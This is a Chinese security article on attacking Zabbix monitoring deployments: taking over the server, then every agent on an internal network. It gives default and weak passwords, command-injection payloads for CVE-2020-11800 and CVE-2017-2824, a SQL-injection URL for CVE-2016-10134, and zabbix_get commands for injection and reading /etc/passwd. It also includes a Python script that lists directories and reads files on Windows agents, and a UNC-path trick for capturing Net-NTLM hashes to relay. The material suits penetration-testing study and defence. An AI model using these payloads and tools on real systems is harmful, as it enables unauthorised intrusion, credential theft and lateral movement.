> 原文链接: https://www.anquanke.com//post/id/250722 


# Zabbix攻击面挖掘与利用


                                阅读量   
                                **34618**
                            
                        |
                        
                                                                                    



[![](https://p2.ssl.qhimg.com/t01c5dbefd18b3ff581.jpg)](https://p2.ssl.qhimg.com/t01c5dbefd18b3ff581.jpg)



## 一、简介

Zabbix是一个支持实时监控数千台服务器、虚拟机和网络设备的企业级解决方案，客户覆盖许多大型企业。本议题介绍了Zabbix基础架构、Zabbix Server攻击面以及权限后利用，如何在复杂内网环境中从Agent控制Server权限、再基于Server拿下所有内网Agent。



## 二、Zabbix监控组件

Zabbix监控系统由以下几个组件部分构成：

### <a class="reference-link" name="1.%20Zabbix%20Server"></a>1. Zabbix Server

Zabbix Server是所有配置、统计和操作数据的中央存储中心，也是Zabbix监控系统的告警中心。在监控的系统中出现任何异常，将被发出通知给管理员。

Zabbix Server的功能可分解成为三个不同的组件，分别为Zabbix Server服务、Web后台及数据库。

### <a class="reference-link" name="2.%20Zabbix%20Proxy"></a>2. Zabbix Proxy

Zabbix Proxy是在大规模分布式监控场景中采用一种分担Zabbix Server压力的分层结构，其多用在跨机房、跨网络的环境中，Zabbix Proxy可以代替Zabbix Server收集性能和可用性数据，然后把数据汇报给Zabbix Server，并且在一定程度上分担了Zabbix Server的压力。

### <a class="reference-link" name="3.%20Zabbix%20Agent"></a>3. Zabbix Agent

Zabbix Agent部署在被监控的目标机器上，以主动监控本地资源和应用程序（硬盘、内存、处理器统计信息等）。

Zabbix Agent收集本地的状态信息并将数据上报给Zabbix Server用于进一步处理。



## 三、Zabbix网络架构

对于Zabbix Agent客户端来说，根据请求类型可分为被动模式及主动模式：
- 被动模式：Server向Agent的10050端口获取监控项数据，Agent根据监控项收集本机数据并响应。
- 主动模式：Agent主动请求Server(Proxy)的10051端口获取监控项列表，并根据监控项收集本机数据提交给Server(Proxy)
从网络部署架构上看，可分为Server-Client架构、Server-Proxy-Client架构、Master-Node-Client架构：
- Server-Client架构
最为常见的Zabbix部署架构，Server与Agent同处于内网区域，Agent能够直接与Server通讯，不受跨区域限制。

[![](https://p0.ssl.qhimg.com/t01d32c736be10ab70b.jpg)](https://p0.ssl.qhimg.com/t01d32c736be10ab70b.jpg)
- Server-Proxy-Client架构
多数见于大规模监控需求的企业内网，其多用在跨机房、跨网络的环境，由于Agent无法直接与位于其他区域的Server通讯，需要由各区域Proxy代替收集Agent数据然后再上报Server。

[![](https://p1.ssl.qhimg.com/t014b4c5eecd4b5278a.jpg)](https://p1.ssl.qhimg.com/t014b4c5eecd4b5278a.jpg)



## 四、Zabbix Agent配置分析

从进程列表中可判断当前机器是否已运行zabbix_agentd服务，Linux进程名为`zabbix_agentd`，Windows进程名为`zabbix_agentd.exe`。

Zabbix Agent服务的配置文件为`zabbix_agentd.conf`，Linux默认路径在`/etc/zabbix/zabbix_agentd.conf`，可通过以下命令查看agent配置文件并过滤掉注释内容：

```
cat /etc/zabbix/zabbix_agentd.conf | grep -v '^#' | grep -v '^$'
```

首先从配置文件定位zabbix_agentd服务的基本信息：
- **Server参数**
Server或Proxy的IP、CIDR、域名等，Agent仅接受来自Server参数的IP请求。

```
Server=192.168.10.100
```
- **ServerActive参数**
Server或Proxy的IP、CIDR、域名等，用于主动模式，Agent主动向ServerActive参数的IP发送请求。

```
ServerActive=192.168.10.100
```
- **StartAgents参数**
为0时禁用被动模式，不监听10050端口。

```
StartAgents=0
```

经过对 `zabbix_agentd.conf` 配置文件各个参数的安全性研究，总结出以下配置不当可能导致安全风险的配置项：
- **EnableRemoteCommands参数**
是否允许来自Zabbix Server的远程命令，开启后可通过Server下发shell脚本在Agent上执行。

**风险样例：**

```
EnableRemoteCommands=1
```
- **AllowRoot参数**
Linux默认以低权限用户zabbix运行，开启后以root权限运行zabbix_agentd服务。

**风险样例：**

```
AllowRoot=1
```
- **UserParameter参数**
自定义用户参数，格式为`UserParameter=&lt;key&gt;,&lt;command&gt;`，Server可向Agent执行预设的自定义参数命令以获取监控数据，以官方示例为例：

```
UserParameter=ping[*],echo $1
```

当Server向Agent执行`ping[aaaa]`指令时，$1为传参的值，Agent经过拼接之后执行的命令为`echo aaaa`，最终执行结果为`aaaa`。

command存在命令拼接，但由于传参内容受UnsafeUserParameters参数限制，默认无法传参特殊符号，所以默认配置利用场景有限。

官方漏洞案例可参考[CVE-2016-4338](https://www.exploit-db.com/exploits/39769)漏洞。
- **UnsafeUserParameters参数**
自定义用户参数是否允许传参任意字符，默认不允许字符\ ‘ “ ` * ? [ ] `{` `}` ~ $ ! &amp; ; ( ) &lt; &gt; | # @

**风险样例：**

```
UnsafeUserParameters=1
```

当UnsafeUserParameters参数配置不当时，组合UserParameter自定义参数的传参命令拼接，可导致远程命令注入漏洞。

由Server向Agent下发指令执行自定义参数，即可在Agent上执行任意系统命令。<br>
以 `UserParameter=ping[*],echo $1` 为例，向Agent执行指令`ping[test &amp;&amp; whoami]`，经过命令拼接后最终执行`echo test &amp;&amp; whoami`，成功注入执行shell命令。
- **Include参数**
加载配置文件目录单个文件或所有文件，通常包含的conf都是配置UserParameter自定义用户参数。

```
Include=/etc/zabbix/zabbix_agentd.d/*.conf
```



## 五、Zabbix Server攻击手法

除了有利用条件的Zabbix Agent漏洞外，默认情况下Agent受限于IP白名单限制，只处理来自Server的请求，所以攻击Zabbix Agent的首要途径就是先拿下Zabbix Server。

经过对Zabbix Server攻击面进行梳理，总结出部分攻击效果较好的漏洞：

### <a class="reference-link" name="1.%20Zabbix%20Web%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4"></a>1. Zabbix Web后台弱口令

Zabbix安装后自带Admin管理员用户和Guests访客用户(低版本)，可登陆Zabbiax后台。

超级管理员默认账号：Admin，密码：zabbix<br>
Guests用户，账号：guest，密码为空

### <a class="reference-link" name="2.%20MySQL%E5%BC%B1%E5%8F%A3%E4%BB%A4"></a>2. MySQL弱口令

从用户习惯来看，运维在配置Zabbix时喜欢用弱口令作为MySQL密码，且搜索引擎的Zabbix配置教程基本用的都是弱口令，这导致实际环境中Zabbix Server的数据库密码通常为弱口令。

除了默认root用户无法外连之外，运维通常会新建MySQL用户 `zabbix`，根据用户习惯梳理了`zabbix`用户的常见密码：

```
123456
zabbix
zabbix123
zabbix1234
zabbix12345
zabbix123456
```

拿下MySQL数据库后，可解密users表的密码md5值，或者直接替换密码的md5为已知密码，即可登录Zabbix Web。

### <a class="reference-link" name="3.%20CVE-2020-11800%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"></a>3. CVE-2020-11800 命令注入

Zabbix Server的trapper功能中active checks命令存在CVE-2020-11800命令注入漏洞，该漏洞为基于CVE-2017-2824的绕过利用。<br>
未授权攻击者向Zabbix Server的10051端口发送trapper功能相关命令，利用漏洞即可在Zabbix Server上执行系统命令。

`active checks`是Agent主动检查时用于获取监控项列表的命令，Zabbix Server在开启自动注册的情况下，通过`active checks`命令请求获取一个不存在的host时，自动注册机制会将json请求中的host、ip添加到interface数据表里，其中CVE-2020-11800漏洞通过ipv6格式绕过ip字段检测注入执行shell命令，**受数据表字段限制Payload长度只能为64个字符**。

```
`{`"request":"active checks","host":"vulhub","ip":"ffff:::;whoami"`}`
```

自动注册调用链：

```
active checks -&gt; send_list_of_active_checks_json() -&gt; get_hostid_by_host() -&gt; DBregister_host()
```

`command`指令可以在未授权的情况下可指定主机(hostid)执行指定脚本(scriptid)，Zabbix存在3个默认脚本，脚本中的``{`HOST.CONN`}``在脚本调用的时候会被替换成主机IP。

```
# scriptid == 1 == /bin/ping -c `{`HOST.CONN`}` 2&gt;&amp;1
# scriptid == 2 == /usr/bin/traceroute `{`HOST.CONN`}` 2&gt;&amp;1
# scriptid == 3 == sudo /usr/bin/nmap -O `{`HOST.CONN`}` 2&gt;&amp;1
```

scriptid指定其中任意一个，hostid为注入恶意Payload后的主机id，但自动注册后的hostid是未知的，所以通过`command`指令遍历hostid的方式都执行一遍，最后成功触发命令注入漏洞。

```
`{`"request":"command","scriptid":1,"hostid":10001`}`
```

由于默认脚本的类型限制，脚本都是在Zabbix Server上运行，Zabbix Proxy是无法使用command指令的。payload长度受限制可拆分多次执行，必须更换host名称以执行新的payload。

漏洞靶场及利用脚本：[Zabbix Server trapper命令注入漏洞（CVE-2020-11800）](https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2020-11800)

[![](https://p2.ssl.qhimg.com/t013d9e368802136a8d.jpg)](https://p2.ssl.qhimg.com/t013d9e368802136a8d.jpg)

### <a class="reference-link" name="4.%20CVE-2017-2824%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"></a>4. CVE-2017-2824 命令注入

上面小结已详细讲解，CVE-2017-2824与CVE-2020-11800漏洞点及利用区别不大，不再复述，可参考链接：[https://talosintelligence.com/vulnerability_reports/TALOS-2017-0325](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0325)

漏洞靶场及利用脚本：[Zabbix Server trapper命令注入漏洞（CVE-2017-2824）](https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2017-2824)

### <a class="reference-link" name="5.%20CVE-2016-10134%20SQL%E6%B3%A8%E5%85%A5"></a>5. CVE-2016-10134 SQL注入

CVE-2016-10134 SQL注入漏洞已知有两个注入点：
- latest.php，需登录，可使用未关闭的Guest访客账号。
```
/jsrpc.php?type=0&amp;mode=1&amp;method=screen.get&amp;profileIdx=web.item.graph&amp;resourcetype=17&amp;profileIdx2=updatexml(0,concat(0xa,user()),0)
```

[![](https://p4.ssl.qhimg.com/t01e99a18c88f4e15ae.jpg)](https://p4.ssl.qhimg.com/t01e99a18c88f4e15ae.jpg)
- jsrpc.php，无需登录即可利用。
利用脚本：[https://github.com/RicterZ/zabbixPwn](https://github.com/RicterZ/zabbixPwn)

[![](https://p0.ssl.qhimg.com/t01eb868ad013a64a95.jpg)](https://p0.ssl.qhimg.com/t01eb868ad013a64a95.jpg)

漏洞靶场及利用脚本：[zabbix latest.php SQL注入漏洞（CVE-2016-10134）](https://github.com/vulhub/vulhub/tree/master/zabbix/CVE-2016-10134)



## 六、Zabbix Server权限后利用

拿下Zabbix Server权限只是阶段性的成功，接下来的问题是如何控制Zabbix Agent以达到最终攻击目的。

Zabbix Agent的10050端口仅处理来自Zabbix Server或Proxy的请求，所以后续攻击都是依赖于Zabbix Server权限进行扩展，本章节主要讲解基于监控项item功能的后利用。

> 在zabbix中，我们要监控的某一个指标，被称为“监控项”，就像我们的磁盘使用率，在zabbix中就可以被认为是一个“监控项”(item)，如果要获取到“监控项”的相关信息，我们则要执行一个命令，但是我们不能直接调用命令，而是通过一个“别名”去调用命令，这个“命令别名”在zabbix中被称为“键”(key)，所以在zabbix中，如果我们想要获取到一个“监控项”的值，则需要有对应的“键”，通过“键”能够调用相应的命令，获取到对应的监控信息。

以Zabbix 4.0版本为例，按照个人理解 item监控项可分为**通用监控项、主动检查监控项、Windows监控项、自定义用户参数(UserParameter)监控项**，Agent监控项较多不一一例举，可参考以下链接：<br>[1. Zabbix Agent监控项](https://www.zabbix.com/documentation/4.0/zh/manual/config/items/itemtypes/zabbix_agent)<br>[2. Zabbix Agent Windows监控项](https://www.zabbix.com/documentation/4.0/zh/manual/config/items/itemtypes/zabbix_agent/win_keys)

在控制Zabbix Server权限的情况下可通过zabbix_get命令向Agent获取监控项数据，比如说获取Agent的系统内核信息：

```
zabbix_get -s 172.21.0.4 -p 10050 -k "system.uname"
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017ba0f05890a022cf.jpg)

结合上述知识点，针对item监控项的攻击面进行挖掘，总结出以下利用场景：

### <a class="reference-link" name="1.%20EnableRemoteCommands%E5%8F%82%E6%95%B0%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"></a>1. EnableRemoteCommands参数远程命令执行

Zabbix最为经典的命令执行利用姿势，许多人以为控制了Zabbix Server就肯定能在Agent上执行命令，其实不然，Agent远程执行系统命令需要在`zabbix_agentd.conf`配置文件中开启EnableRemoteCommands参数。

在Zabbix Web上添加脚本，“执行在”选项可根据需求选择，**“执行在Zabbix服务器” 不需要开启EnableRemoteCommands参数，所以一般控制Zabbix Web后可通过该方式在Zabbix Server上执行命令拿到服务器权限。**

[![](https://p4.ssl.qhimg.com/t01d0eca50eec3f2a9a.jpg)](https://p4.ssl.qhimg.com/t01d0eca50eec3f2a9a.jpg)

如果要指定某个主机执行该脚本，可从Zabbix Web的“监测中 -&gt; 最新数据”功能中根据过滤条件找到想要执行脚本的主机，单击主机名即可在对应Agent上执行脚本。

**这里有个常见误区，如果类型是“执行在Zabbix服务器”，无论选择哪台主机执行脚本，最终都是执行在Zabbix Server上。**

如果类型是“执行在Zabbix客户端”，Agent配置文件在未开启EnableRemoteCommands参数的情况下会返回报错。

[![](https://p4.ssl.qhimg.com/t019b2b361e783d3439.jpg)](https://p4.ssl.qhimg.com/t019b2b361e783d3439.jpg)

Agent配置文件在开启EnableRemoteCommands参数的情况下可成功下发执行系统命令。

[![](https://p5.ssl.qhimg.com/t0118acca5ecbb33999.jpg)](https://p5.ssl.qhimg.com/t0118acca5ecbb33999.jpg)

如果不想在Zabbix Web上留下太多日志痕迹，或者想批量控制Agent，拿下Zabbix Server权限后可以通过zabbix_get命令向Agent执行监控项命令，**在Zabbix Web执行脚本实际上等于执行system.run监控项命令**。

也可以基于Zabbix Server作为隧道跳板，在本地执行zabbix_get命令也能达到同样效果（Zabbix Agent为IP白名单校验）。

[![](https://p4.ssl.qhimg.com/t016b2c120acc2ac7b0.jpg)](https://p4.ssl.qhimg.com/t016b2c120acc2ac7b0.jpg)

### <a class="reference-link" name="2.%20UserParameter%E8%87%AA%E5%AE%9A%E4%B9%89%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"></a>2. UserParameter自定义参数命令注入

之前介绍UserParameter参数的时候提到过，执行监控项时UserParameter参数command命令的$1、$2等会被替换成item传参值，存在命令注入的风险，但默认受UnsafeUserParameters参数限制无法传入特殊字符。

当Zabbiax Agent的`zabbix_agentd.conf`配置文件开启UnsafeUserParameters参数的情况下，传参值字符不受限制，只需要找到存在传参的自定义参数UserParameter，就能达到命令注入的效果。

举个简单案例，在`zabbix_agentd.conf`文件中添加自定义参数：

```
UserParameter=ping[*],echo $1
```

默认情况下UnsafeUserParameters被禁用，传入特殊字符将无法执行命令。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t016c461a0f7808059e.jpg)

在`zabbix_agentd.conf` 文件中添加 `UnsafeUserParameters=1`，command经过传参拼接后成功注入系统命令。

```
zabbix_get -s 172.19.0.5 -p 10050 -k "ping[test &amp;&amp; id]"
```

[![](https://p3.ssl.qhimg.com/t0157485d2d8c471f82.jpg)](https://p3.ssl.qhimg.com/t0157485d2d8c471f82.jpg)

UnsafeUserParameters参数配置不当问题在监控规模较大的内网里比较常见，内网渗透时可以多留意Agent配置信息。

### <a class="reference-link" name="3.%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"></a>3. 任意文件读取

Zabbix Agent如果没有配置不当的问题，是否有其他姿势可以利用呢？答案是肯定的。

Zabbix原生监控项中，`vfs.file.contents`命令可以读取指定文件，但无法读取超过64KB的文件。

```
zabbix_get -s 172.19.0.5 -p 10050 -k "vfs.file.contents[/etc/passwd]"
```

[![](https://p4.ssl.qhimg.com/t011229435d97d901ee.jpg)](https://p4.ssl.qhimg.com/t011229435d97d901ee.jpg)

**zabbix_agentd服务默认以低权限用户zabbix运行，读取文件受zabbix用户权限限制。开启AllowRoot参数情况下zabbix_agentd服务会以root权限运行，利用`vfs.file.contents`命令就能任意文件读取。**

如果文件超过64KB无法读取，在了解该文件字段格式的情况下可利用`vfs.file.regexp`命令正则获取关键内容。

### <a class="reference-link" name="4.%20Windows%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86"></a>4. Windows目录遍历

Zabbix原生监控项中，`wmi.get`命令可以执行WMI查询并返回第一个对象，通过WQL语句可以查询许多机器信息，以下例举几种利用场景：
- 遍历盘符
由于`wmi.get`命令每次只能返回一行数据，所以需要利用WQL的条件语句排除法逐行获取数据。

比如WQL查询盘符时，只返回了C:

```
zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM Win32_LogicalDisk\"]"
```

通过追加条件语句排除已经查询处理的结果，从而获取下一行数据。

```
zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM Win32_LogicalDisk WHERE Name!='C:'\"]"
```

可通过脚本一直追加条件语句进行查询，直至出现`Cannot obtain WMI information.`代表WQL已经无法查询出结果。从图中可以看到通过`wmi.get`命令查询出了该机器上存在C:、D:盘符。

[![](https://p3.ssl.qhimg.com/t01750894d2aff57471.jpg)](https://p3.ssl.qhimg.com/t01750894d2aff57471.jpg)
- 遍历目录
获取C:下的目录，采用条件语句排除法逐行获取。

```
zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Caption FROM Win32_Directory WHERE Drive='C:' AND Path='\\\\' \"]"

zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Caption FROM Win32_Directory WHERE Drive='C:' AND Path='\\\\' AND Caption != 'C:\\\\\$Recycle.Bin' \"]"

zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Caption FROM Win32_Directory WHERE Drive='C:' AND Path='\\\\' AND Caption != 'C:\\\\\$Recycle.Bin' AND Caption != 'C:\\\\\$WinREAgent' \"]"

...
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d26db618615ffcd3.jpg)

获取C:下的文件，采用条件语句排除法逐行获取。

```
zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM CIM_DataFile WHERE Drive='C:' AND Path='\\\\' \"]"

zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM CIM_DataFile WHERE Drive='C:' AND Path='\\\\' AND Name != 'C:\\\\\$WINRE_BACKUP_PARTITION.MARKER' \"]"

zabbix_get -s 192.168.98.2 -p 10050 -k "wmi.get[root\\cimv2,\"SELECT Name FROM CIM_DataFile WHERE Drive='C:' AND Path='\\\\' AND Name != 'C:\\\\\$WINRE_BACKUP_PARTITION.MARKER' AND Name !='C:\\\\browser.exe' \"]"

...
```

[![](https://p2.ssl.qhimg.com/t01c0ad9f0b999fb732.jpg)](https://p2.ssl.qhimg.com/t01c0ad9f0b999fb732.jpg)

利用`wmi.get`命令进行目录遍历、文件遍历，结合`vfs.file.contents`命令就能够在Windows下实现任意文件读取。

基于zabbix_get命令写了个python脚本，实现Windows的列目录、读文件功能。

```
import os
import sys

count = 0

def zabbix_exec(ip, command):
    global count
    count = count + 1
    check = os.popen("./zabbix_get -s " + ip + " -k \"" + command + "\"").read()
    if "Cannot obtain WMI information" not in check:
        return check.strip()
    else:
        return False

def getpath(path):
    return path.replace("\\","\\\\\\\\").replace("$","\\$")

def GetDisk(ip):
    where = ""
    while(True):
        check_disk = zabbix_exec(ip, "wmi.get[root\cimv2,\\\"SELECT Name FROM Win32_LogicalDisk WHERE Name != '' " + where + "\\\"]")
        if check_disk:
            print(check_disk)
            where = where + "AND Name != '" + check_disk+ "'"
        else:
            break

def GetDirs(ip, dir):
    drive = dir[0:2]
    path = dir[2:]

    where = ""
    while(True):
        check_dir = zabbix_exec(ip, "wmi.get[root\cimv2,\\\"SELECT Caption FROM Win32_Directory WHERE Drive='" + drive + "' AND Path='" + getpath(path) + "' " + where + "\\\"]")
        if check_dir:
            print(check_dir)
            where = where + "AND Caption != '" + getpath(check_dir) + "'"
        else:
            break

def GetFiles(ip, dir):
    drive = dir[0:2]
    path = dir[2:]

    where = ""
    while(True):
        check_file = zabbix_exec(ip, "wmi.get[root\cimv2,\\\"SELECT Name FROM CIM_DataFile WHERE Drive='" + drive + "' AND Path='" + getpath(path) + "' " + where + "\\\"]")
        if check_file:
            if "Invalid item key format" in check_file:
                continue
            print(check_file)
            where = where + "AND Name != '" + getpath(check_file) + "'"
        else:
            break

def Readfile(ip, file):
    read = zabbix_exec(ip, "vfs.file.contents[" + file + "]")
    print(read)

if __name__ == "__main__":
    if len(sys.argv) == 2:
        GetDisk(sys.argv[1])
    elif sys.argv[2][-1] != "\\":
        Readfile(sys.argv[1], sys.argv[2])
    else:
        GetDirs(sys.argv[1],sys.argv[2])
        GetFiles(sys.argv[1],sys.argv[2])

    print("Request count: " + str(count))
```

### <a class="reference-link" name="5.%20Windows%20UNC%E8%B7%AF%E5%BE%84%E5%88%A9%E7%94%A8"></a>5. Windows UNC路径利用

在Windows Zabbix Agent环境中，可以利用`vfs.file.contents`命令读取UNC路径，窃取Zabbix Agent机器的Net-NTLM hash，从而进一步Net-NTLM relay攻击。

Window Zabbix Agent默认安装成Windows服务，运行在SYSTEM权限下。在工作组环境中，system用户的Net-NTLM hash为空，所以工作组环境无法利用。

在域内环境中，SYSTEM用户即机器用户，如果是Net-NTLM v1的情况下，可以利用Responder工具获取Net-NTLM v1 hash并通过算法缺陷解密拿到NTLM hash，配合资源约束委派获取域内机器用户权限，从而拿下Agent机器权限。

也可以配合CVE-2019-1040漏洞，relay到ldap上配置基于资源的约束委派进而拿下Agent机器权限。

```
zabbix_get -s 192.168.30.200 -p 10050 -k "vfs.file.contents[\\\\192.168.30.243\\cc]"
```

[![](https://p3.ssl.qhimg.com/t017806259cafbfd82c.jpg)](https://p3.ssl.qhimg.com/t017806259cafbfd82c.jpg)

[![](https://p1.ssl.qhimg.com/t01cb1b220ea7b8aa72.jpg)](https://p1.ssl.qhimg.com/t01cb1b220ea7b8aa72.jpg)

### <a class="reference-link" name="6.%20Zabbix%20Proxy%E5%92%8C%E4%B8%BB%E5%8A%A8%E6%A3%80%E6%9F%A5%E6%A8%A1%E5%BC%8F%E5%88%A9%E7%94%A8%E5%9C%BA%E6%99%AF"></a>6. Zabbix Proxy和主动检查模式利用场景

通过zabbix_get工具执行监控项命令只适合Agent被动模式且10050端口可以通讯的场景（同时zabbix_get命令也是为了演示漏洞方便）。

如果在Zabbix Proxy场景或Agent主动检查模式的情况下，Zabbix Server无法直接与Agent 10050端口通讯，可以使用比较通用的办法，就是通过Zabbix Web添加监控项。

以UserParameter命令注入漏洞举例，给指定主机添加监控项，键值中填入监控项命令，信息类型选择文本：

[![](https://p2.ssl.qhimg.com/t0164580b2d6612e2ad.jpg)](https://p2.ssl.qhimg.com/t0164580b2d6612e2ad.jpg)

在最新数据中按照筛选条件找到指定主机，等待片刻就能看到执行结果。

[![](https://p3.ssl.qhimg.com/t0139c8d427ea61e88c.jpg)](https://p3.ssl.qhimg.com/t0139c8d427ea61e88c.jpg)

任意文件读取漏洞也同理：

[![](https://p0.ssl.qhimg.com/t01001b25f439f06307.jpg)](https://p0.ssl.qhimg.com/t01001b25f439f06307.jpg)

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t0184de2b6f4304245e.jpg)

**通过zabbix_get工具执行结果最大可返回512KB的数据，执行结果存储在MySQL上的限制最大为64KB。**

ps: 添加的监控项会一直定时执行，所以执行完后记得删除监控项。



## 七、参考链接

[https://www.zabbix.com/documentation/4.0/zh/manual/config/items/userparameters](https://www.zabbix.com/documentation/4.0/zh/manual/config/items/userparameters)<br>[https://github.com/vulhub/vulhub](https://github.com/vulhub/vulhub)<br>[https://talosintelligence.com/vulnerability_reports/TALOS-2017-0325](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0325)<br>[https://www.zsythink.net/archives/551/](https://www.zsythink.net/archives/551/)
